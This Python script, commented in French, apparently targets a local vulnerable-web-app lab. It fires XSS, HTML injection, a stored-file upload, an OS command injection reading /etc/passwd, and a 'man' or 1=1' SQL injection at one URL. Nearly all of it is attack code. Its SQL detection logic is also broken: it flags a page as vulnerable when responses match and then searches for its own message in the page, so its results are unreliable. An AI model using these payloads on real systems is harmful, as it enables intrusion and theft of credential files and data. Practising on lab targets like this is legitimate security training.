import requests
from bs4 import BeautifulSoup

def html_injection_get_post(url):
    # Ouvre la page
    response = requests.get(url)

    # Envoie le formulaire avec des balises innocentes
    payload = {"input_name": "<h1>Test</h1>"}
    response = requests.post(url, data=payload)

    # Verifie que la reponse contient bien les balises
    if "<h1>Test</h1>" in response.text:
        print("Balises détectées dans la réponse")

    # Exploite la vulnérabilité en envoyant la charge
    exploit_payload = {"input_name": "<script>alert('XSS')</script>"}
    response = requests.post(url, data=exploit_payload)

    # Verifie que la charge est bien retournée dans la page
    if "<script>alert('XSS')</script>" in response.text:
        print("Charge XSS détectée dans la réponse")

def html_injection_stored(url):
    # Ouvre la page
    response = requests.get(url)

    # Envoie un formulaire dans le champ du formulaire qui contient un champ de fichier et un bouton submit
    file_content = "<h1>Stored XSS</h1>"
    payload = {"file_field": ("malicious.html", file_content), "submit_button": "Submit"}
    response = requests.post(url, files=payload)

    # Tester le formulaire injecté
    if "<h1>Stored XSS</h1>" in response.text:
        print("Stored XSS détecté dans la réponse")

    # Verifier où votre fichier est placé (si le serveur permet le téléchargement du fichier)
    print("Votre fichier peut être accessible à l'URL:", response.url)

def os_command_injection(url):
    # Ouvre la page
    response = requests.get(url)

    # Inject cat /etc/passwd
    payload = {"input_command": "cat /etc/passwd"}
    response = requests.post(url, data=payload)

    # Recupérer le fichier /etc/passwd
    print("Contenu du fichier /etc/passwd:\n", response.text)

def sql_injection(url):
    # Ouvre la page avec un search vide
    response_empty = requests.get(url)

    # Ouvre la page avec un search de ' (apostrophe)
    response_inject = requests.get(url + "?search='")

    # Comparer les 2 résultats pour détecter la vulnérabilité
    if response_empty.text == response_inject.text:
        print("La page est vulnérable à l'injection SQL")

    # Si vulnérabilité détectée, faire une injection
    if "La page est vulnérable à l'injection SQL" in response_empty.text:
        # Injection SQL: man' or 1=1 #--
        injection_payload = {"search": "man' or 1=1 #--"}
        response_injection = requests.get(url, params=injection_payload)

        # Utiliser BeautifulSoup pour extraire les éléments de la page
        soup = BeautifulSoup(response_injection.text, 'html.parser')
        # afficher le resultat de l'injection SQL
        for link in soup.find_all('a'):
            print("Lien trouvé:", link.get('href'))

if __name__ == "__main__":
    target_url = "http://localhost/sqli_1.php"
    
    print("\nHTML Injection (GET/POST):")
    html_injection_get_post(target_url)

    print("\nHTML Injection (Stored):")
    html_injection_stored(target_url)

    print("\nOS Command Injection:")
    os_command_injection(target_url)

    print("\nSQL Injection:")
    sql_injection(target_url)
